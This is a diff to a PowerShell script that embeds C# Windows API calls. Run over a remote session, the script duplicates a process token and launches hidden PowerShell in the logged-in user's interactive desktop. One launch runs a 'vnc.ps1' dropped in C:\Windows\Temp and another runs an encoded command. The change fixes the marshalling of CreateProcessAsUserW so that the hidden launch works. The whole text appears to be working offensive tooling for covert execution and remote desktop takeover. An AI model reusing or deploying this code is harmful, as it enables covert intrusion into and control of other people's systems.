@@ -24,7 +24,7 @@ public class WTS {
     [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
     [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
     [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
-    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool CreateProcessAsUserW(IntPtr hToken, IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInformation);
     [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO {
         public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
         public int dwX; public int dwY; public int dwXSize; public int dwYSize;
@@ -84,10 +84,15 @@ public class WTS {
 "`$si = New-Object WTS+STARTUPINFO`n" +
 "`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
 "`$si.lpDesktop = 'WinSta0\Default'`n" +
-"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
 "`$cmdline = 'powershell.exe -nop -w hidden -f C:\Windows\Temp\vnc.ps1'`n" +
-"`$ok = [WTS]::CreateProcessAsUserW(`$tok, `$null, `$cmdline, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, `$null, [ref]`$si, [ref]`$pi)`n" +
-"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + `$pi.dwProcessId) }`n"
+"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
+"`$ptrSi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf(`$si))`n" +
+"[System.Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)`n" +
+"`$ptrPi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)`n" +
+"[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0), 0, `$ptrPi, 24)`n" +
+"`$cp = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmdline)`n" +
+"`$ok = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)`n" +
+"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + [System.Runtime.InteropServices.Marshal]::ReadInt32(`$ptrPi, 16)) }`n"
 
         $sb = [scriptblock]::Create($engine)
         invoke-command -session $s -scriptblock {
@@ -150,10 +155,15 @@ public class WTS {
 "`$si = New-Object WTS+STARTUPINFO`n" +
 "`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
 "`$si.lpDesktop = 'WinSta0\Default'`n" +
-"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
 "`$cmdline = 'powershell.exe -nop -w hidden -e ' + '$enc'`n" +
-"`$ok = [WTS]::CreateProcessAsUserW(`$tok, `$null, `$cmdline, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, `$null, [ref]`$si, [ref]`$pi)`n" +
-"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + `$pi.dwProcessId) }`n" +
+"`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
+"`$ptrSi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf(`$si))`n" +
+"[System.Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)`n" +
+"`$ptrPi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)`n" +
+"[System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0), 0, `$ptrPi, 24)`n" +
+"`$cp = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmdline)`n" +
+"`$ok = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)`n" +
+"if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + [System.Runtime.InteropServices.Marshal]::ReadInt32(`$ptrPi, 16)) }`n" +
 "Start-Sleep -Seconds 12"
 
         $sb = [scriptblock]::Create($engine)
